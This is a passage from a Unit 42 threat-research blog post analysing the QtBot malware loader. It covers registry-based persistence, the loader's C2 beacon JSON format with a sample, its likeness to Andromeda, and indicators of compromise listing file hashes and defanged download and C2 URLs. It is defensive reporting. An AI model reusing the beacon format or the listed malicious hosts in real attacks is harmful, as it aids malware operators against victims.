<p style="text-align: center;"><em>Figure 9. Keyboard layout checks in order to prevent infection of former USSR countries.</em></p>
<p>For persistence, a temp file is generated with a randomly generated name and stored in %APPDATA%\Local\Temp\ in a randomly named folder.<br />
This randomly generated value is used for the folder name and is stored in the registry key “HKCU\Software\QtProject” in the value “0FAD2D5E”. The malware stores additional encrypted data in this key:<br />
“0FAD2D5E” – Random Value + Unicode temp file name + length of data blob<br />
“0FAD2D5EDZCW” – RC4 Encrypted C2 Domain<br />
Successful malware communications use a format string like the one below:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692881018f4124908846" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
{"rep":0,"bid":"%s","ver":%d,"cam":"%s","cis":%d,"lvl":%d,"adm":%d,"bit":%d,"osv":%d,"osb":
%d,"tmt":%d}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692881018f4124908846-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f4124908846-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692881018f4124908846-1"><span class="crayon-sy">{</span><span class="crayon-s">"rep"</span><span class="crayon-o">:</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-s">"bid"</span><span class="crayon-o">:</span><span class="crayon-s">"%s"</span><span class="crayon-sy">,</span><span class="crayon-s">"ver"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"cam"</span><span class="crayon-o">:</span><span class="crayon-s">"%s"</span><span class="crayon-sy">,</span><span class="crayon-s">"cis"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"lvl"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"adm"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"bit"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"osv"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"osb"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f4124908846-2"><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"tmt"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>When this is filled in, it would look similar to the following:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692881018f7873508230" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
{"rep":0,"bid":"LD0fJMblnCbrDT8Mvma4Rg==","ver":256,"cam":"nightboom","cis":0,"lvl":1228
8,"adm":1,"bit":1,"osv":1537,"osb":7601,"tmt":30}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692881018f7873508230-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f7873508230-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692881018f7873508230-1"><span class="crayon-sy">{</span><span class="crayon-s">"rep"</span><span class="crayon-o">:</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-s">"bid"</span><span class="crayon-o">:</span><span class="crayon-s">"LD0fJMblnCbrDT8Mvma4Rg=="</span><span class="crayon-sy">,</span><span class="crayon-s">"ver"</span><span class="crayon-o">:</span><span class="crayon-cn">256</span><span class="crayon-sy">,</span><span class="crayon-s">"cam"</span><span class="crayon-o">:</span><span class="crayon-s">"nightboom"</span><span class="crayon-sy">,</span><span class="crayon-s">"cis"</span><span class="crayon-o">:</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-s">"lvl"</span><span class="crayon-o">:</span><span class="crayon-cn">1228</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f7873508230-2"><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-s">"adm"</span><span class="crayon-o">:</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-s">"bit"</span><span class="crayon-o">:</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-s">"osv"</span><span class="crayon-o">:</span><span class="crayon-cn">1537</span><span class="crayon-sy">,</span><span class="crayon-s">"osb"</span><span class="crayon-o">:</span><span class="crayon-cn">7601</span><span class="crayon-sy">,</span><span class="crayon-s">"tmt"</span><span class="crayon-o">:</span><span class="crayon-cn">30</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Some of these values are unknown, though we are able to speculate the nature of their meanings.  We believe they are as follows:<br />
&#8220;rep&#8221; – communication attempt repetitions from a single host<br />
&#8220;bid&#8221; – binary identification; this value is stored in registry value &#8220;0FAD2D5E&#8221; and is RC4<br />
encrypted and base64 encoded before sending<br />
&#8220;ver&#8221; – likely versioning information<br />
&#8220;cam&#8221; – campaign name<br />
&#8220;cis&#8221; – unknown hardcoded value<br />
&#8220;lvl&#8221; – system integrity level<br />
&#8220;adm&#8221; – if the malware has administrative privileges<br />
&#8220;bit&#8221; – unknown<br />
&#8220;osv&#8221; – operating system version<br />
&#8220;osb&#8221; – operating system build<br />
&#8220;tmt&#8221; – timeout in seconds<br />
<span style="font-size: 18pt;"><br />
Similarities to Andromeda</span><br />
Existing analysis of the <a href="https://blog.avast.com/andromeda-under-the-microscope">Andromeda loader and bot</a> reveals some commonalities between Andromeda and QtBot.  The most apparent similarities of these two families are the running process hash check  used for anti-analysis, host infection denylisting based on language identifiers returned from GetKeyboardLayout, separate infection and task reports for C2 reporting, and code injection target, msiexec.exe.  At this time due to the seemingly major updates to the base Andromeda, which is still active, we are referring to this particular family as a new entity and have created a separate identifier in Autofocus, QtBot, to help users differentiate.<br />
<span style="font-size: 18pt;"><br />
Conclusion</span><br />
While geographic location specific malware delivery is not a new phenomenon, the combination of two previously disparate malware family affiliates utilizing unified malspam campaigns and droppers is an interesting shift in tactics. QtBot protects itself and the decision tree by which targeting is established and offers a significantly more robust anti-analysis package to stymie analysts.<br />
Palo Alto Networks has observed more than 4 million unique sessions with QtBot behaviors which can be seen with the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.QtBot">QtBot tag</a> in AutoFocus. Customers using Wildfire are protected from this threat.<br />
Palo Alto Networks would like to thank researchers at Proofpoint, who identifies this threat as &#8220;QtLoader&#8221;, for first bringing these campaigns to our attention.<br />
<span style="font-size: 18pt;"><br />
IOCs</span><br />
798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120 – QtBot<br />
d97be402740f6a0fc70c90751f499943bf26f7c00791d46432889f1bedf9dbd2 – QtBot used for payload differentiation screenshots<br />
bb92218314ffdc450320f1d44d8a2fe163c585827d9ca3e9a00cb2ea0e27f0c9 – DDE Dropper<br />
9d2ce15fd9112d52fa09c543527ef0b5bf07eb4c07794931c5768e403c167d49 – Locky<br />
4fcee2679cc65585cc1c1c7baa020ec262a2b7fb9b8dc7529a8f73fab029afad – Trickbot<br />
hXXp://hobystube[.]net – Locky Download Location<br />
hXXp://kengray[.]com – Trickbot Download Location<br />
hXXp://fetchstats[.]net – QtBot C2<br />
hXXp://toundlefa[.]net – QtBot C2<br />
hXXp://aurea-art[.]ru/incrHG32<br />
hXXp://castellodimontegioco[.]com/incrHG32<br />
hXXp://nl.flipcapella[.]com/incrHG32<br />
hXXp://dotecnia[.]cl/incrHG32<br />
hXXp://christakranzl[.]at/incrHG32<br />
hXXp://burka[.]ch/JHhdg33<br />
hXXp://celebrityonline[.]cz – URI varies based on payload</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
